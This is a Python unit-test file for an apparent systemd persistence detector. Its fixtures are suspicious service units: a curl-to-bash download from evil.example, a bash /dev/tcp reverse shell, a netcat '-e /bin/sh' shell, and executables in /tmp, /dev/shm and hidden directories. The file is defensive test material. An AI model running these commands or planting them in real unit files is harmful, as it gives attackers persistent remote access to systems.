import os
import stat
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory
from unittest.mock import patch

from persisthunt.detectors.systemd import SystemdDetector
from persisthunt.findings import FindingCollection, Finding, Severity

class TestSystemdDetector(unittest.TestCase):
    def setUp(self):
        self.temp_dir = TemporaryDirectory()
        self.root = Path(self.temp_dir.name)

        # Directory layout
        self.etc_systemd = self.root / "etc" / "systemd" / "system"
        self.etc_systemd.mkdir(parents=True)
        self.usr_systemd = self.root / "usr" / "lib" / "systemd" / "system"
        self.usr_systemd.mkdir(parents=True)
        self.user_systemd = self.root / "etc" / "systemd" / "user"
        self.user_systemd.mkdir(parents=True)

    def tearDown(self):
        self.temp_dir.cleanup()

    def _get_detector(self):
        return SystemdDetector(
            root_prefix=self.root,
            system_dirs=[self.etc_systemd, self.usr_systemd],
            user_dirs=[self.user_systemd],
        )

    def test_empty_system_returns_empty_collection(self):
        detector = self._get_detector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_missing_directories_do_not_crash(self):
        detector = SystemdDetector(
            system_dirs=[self.root / "nonexistent_systemd"],
            user_dirs=[self.root / "nonexistent_user"],
        )
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        self.assertEqual(findings.count(), 0)

    def test_normal_legitimate_services_produce_zero_findings(self):
        sshd_content = (
            "[Unit]\n"
            "Description=OpenSSH server daemon\n"
            "After=network.target\n"
            "\n"
            "[Service]\n"
            "Type=notify\n"
            "ExecStartPre=/usr/sbin/sshd -t\n"
            "ExecStart=/usr/sbin/sshd -D $SSHD_OPTS\n"
            "ExecReload=/bin/kill -HUP $MAINPID\n"
            "KillMode=process\n"
            "Restart=on-failure\n"
            "\n"
            "[Install]\n"
            "WantedBy=multi-user.target\n"
        )
        (self.usr_systemd / "sshd.service").write_text(sshd_content)

        detector = self._get_detector()
        findings = detector.scan()
        self.assertEqual(findings.count(), 0)

    def test_suspicious_temp_directory_execstart(self):
        service_content = (
            "[Unit]\n"
            "Description=Temporary Runner\n"
            "[Service]\n"
            "ExecStart=/tmp/malicious_payload\n"
        )
        (self.etc_systemd / "bad.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SYSTEMD-003"]
        self.assertEqual(len(temp_findings), 1)
        self.assertEqual(temp_findings[0].severity, Severity.HIGH)
        self.assertIn("/tmp/malicious_payload", temp_findings[0].evidence)
        self.assertIn("bad.service:4", temp_findings[0].location)

    def test_suspicious_execstartpre_and_execstartpost(self):
        service_content = (
            "[Unit]\n"
            "Description=Multi Stage Service\n"
            "[Service]\n"
            "ExecStartPre=+/var/tmp/stage1.sh\n"
            "ExecStart=/usr/bin/legit-daemon\n"
            "ExecStartPost=-/dev/shm/stage2.sh\n"
        )
        (self.etc_systemd / "staged.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SYSTEMD-003"]
        self.assertEqual(len(temp_findings), 2)
        locations = {f.location for f in temp_findings}
        self.assertTrue(any(":4" in loc for loc in locations))
        self.assertTrue(any(":6" in loc for loc in locations))

    def test_suspicious_download_pipe_indicator(self):
        service_content = (
            "[Unit]\n"
            "Description=Updater\n"
            "[Service]\n"
            "ExecStart=/bin/sh -c 'curl -s https://evil.example/agent | bash'\n"
        )
        (self.etc_systemd / "updater.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        f_ids = {f.id for f in findings}
        self.assertIn("PH-SYSTEMD-002", f_ids)
        download_findings = [f for f in findings if f.id == "PH-SYSTEMD-002"]
        self.assertEqual(download_findings[0].severity, Severity.HIGH)

    def test_suspicious_network_socket_reverse_shell(self):
        service_content = (
            "[Unit]\n"
            "Description=Reverse Shell Service\n"
            "[Service]\n"
            "ExecStart=/bin/bash -i >& /dev/tcp/192.168.1.100/9001 0>&1\n"
        )
        (self.etc_systemd / "shell.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        net_findings = [f for f in findings if f.id == "PH-SYSTEMD-001"]
        self.assertEqual(len(net_findings), 1)
        self.assertEqual(net_findings[0].severity, Severity.HIGH)
        self.assertIn("/dev/tcp", net_findings[0].evidence)

    def test_suspicious_netcat_utility(self):
        service_content = (
            "[Service]\n"
            "ExecStart=/bin/nc -e /bin/sh 10.0.0.1 4444\n"
        )
        (self.etc_systemd / "nc.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        nc_findings = [f for f in findings if f.id == "PH-SYSTEMD-001"]
        self.assertEqual(len(nc_findings), 1)
        self.assertIn("nc", nc_findings[0].evidence)

    def test_executable_in_hidden_directory(self):
        service_content = (
            "[Service]\n"
            "ExecStart=/opt/.hidden_dir/agent.bin\n"
        )
        (self.etc_systemd / "hidden.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        hidden_findings = [f for f in findings if f.id == "PH-SYSTEMD-004"]
        self.assertEqual(len(hidden_findings), 1)
        self.assertEqual(hidden_findings[0].severity, Severity.MEDIUM)
        self.assertIn("/opt/.hidden_dir/agent.bin", hidden_findings[0].evidence)

    def test_hidden_unit_file(self):
        service_content = (
            "[Service]\n"
            "ExecStart=/usr/bin/daemon\n"
        )
        (self.etc_systemd / ".stealth.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        hidden_unit_findings = [f for f in findings if f.id == "PH-SYSTEMD-004"]
        self.assertEqual(len(hidden_unit_findings), 1)
        self.assertIn(".stealth.service", hidden_unit_findings[0].evidence)

    def test_inline_interpreter_execution(self):
        service_content = (
            "[Service]\n"
            "ExecStart=/usr/bin/python3 -c 'import socket; ...'\n"
        )
        (self.etc_systemd / "inline.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        inline_findings = [f for f in findings if f.id == "PH-SYSTEMD-005"]
        self.assertEqual(len(inline_findings), 1)
        self.assertEqual(inline_findings[0].severity, Severity.MEDIUM)

    def test_insecure_world_writable_unit_permissions(self):
        service_file = self.etc_systemd / "insecure.service"
        service_file.write_text(
            "[Service]\n"
            "ExecStart=/usr/bin/echo safe\n"
        )
        # Make world-writable (0o666)
        service_file.chmod(0o666)

        detector = self._get_detector()
        findings = detector.scan()

        perm_findings = [f for f in findings if f.id == "PH-SYSTEMD-006"]
        self.assertEqual(len(perm_findings), 1)
        self.assertEqual(perm_findings[0].severity, Severity.HIGH)

    def test_broken_symlink_in_wants_directory(self):
        wants_dir = self.etc_systemd / "multi-user.target.wants"
        wants_dir.mkdir()
        broken_link = wants_dir / "missing.service"
        broken_link.symlink_to("/usr/lib/systemd/system/deleted.service")

        detector = self._get_detector()
        findings = detector.scan()

        symlink_findings = [f for f in findings if f.id == "PH-SYSTEMD-091"]
        self.assertEqual(len(symlink_findings), 1)
        self.assertEqual(symlink_findings[0].severity, Severity.LOW)

    def test_malformed_unit_directive(self):
        bad_file = self.etc_systemd / "corrupt.service"
        bad_file.write_text(
            "[Service]\n"
            "This line is missing an equals sign\n"
            "ExecStart=/usr/bin/safe\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        malformed = [f for f in findings if f.id == "PH-SYSTEMD-092"]
        self.assertEqual(len(malformed), 1)
        self.assertEqual(malformed[0].severity, Severity.LOW)

    def test_system_service_executing_from_home(self):
        home_svc = self.etc_systemd / "user_home.service"
        home_svc.write_text(
            "[Service]\n"
            "ExecStart=/home/alice/bin/custom_daemon\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        home_findings = [f for f in findings if f.id == "PH-SYSTEMD-007"]
        self.assertEqual(len(home_findings), 1)
        self.assertEqual(home_findings[0].severity, Severity.LOW)

    def test_user_unit_service_auditing(self):
        user_svc = self.user_systemd / "user_task.service"
        user_svc.write_text(
            "[Service]\n"
            "ExecStart=/tmp/user_agent\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SYSTEMD-003"]
        self.assertEqual(len(temp_findings), 1)

    def test_drop_in_override_configuration(self):
        dropin_dir = self.etc_systemd / "service.d"
        dropin_dir.mkdir()
        override_file = dropin_dir / "override.conf"
        override_file.write_text(
            "[Service]\n"
            "ExecStart=\n"
            "ExecStart=/tmp/override_exec\n"
        )

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SYSTEMD-003"]
        self.assertEqual(len(temp_findings), 1)
        self.assertIn("override.conf", temp_findings[0].location)

    def test_line_continuation_support(self):
        service_content = (
            "[Service]\n"
            "ExecStart=/bin/sh \\\n"
            "    -c \\\n"
            "    '/tmp/continued_payload'\n"
        )
        (self.etc_systemd / "continued.service").write_text(service_content)

        detector = self._get_detector()
        findings = detector.scan()

        temp_findings = [f for f in findings if f.id == "PH-SYSTEMD-003"]
        self.assertEqual(len(temp_findings), 1)

    def test_permission_denied_directory_handling(self):
        with patch("os.scandir", side_effect=PermissionError("Permission denied")):
            detector = self._get_detector()
            findings = detector.scan()

            perm_findings = [f for f in findings if f.id == "PH-SYSTEMD-090"]
            self.assertGreaterEqual(len(perm_findings), 1)
            self.assertEqual(perm_findings[0].severity, Severity.INFO)

    def test_read_only_safety_preserves_files(self):
        service_file = self.etc_systemd / "legit.service"
        original = "[Service]\nExecStart=/usr/bin/sleep 10\n"
        service_file.write_text(original)
        mtime_before = service_file.stat().st_mtime_ns

        detector = self._get_detector()
        findings = detector.scan()

        self.assertEqual(service_file.read_text(), original)
        self.assertEqual(service_file.stat().st_mtime_ns, mtime_before)

    def test_real_system_scan_does_not_crash(self):
        detector = SystemdDetector()
        findings = detector.scan()
        self.assertIsInstance(findings, FindingCollection)
        for f in findings:
            self.assertIsInstance(f, Finding)
            self.assertEqual(f.category, "systemd")
            self.assertTrue(f.id.startswith("PH-SYSTEMD-"))
            self.assertIsInstance(f.severity, Severity)

if __name__ == "__main__":
    unittest.main()
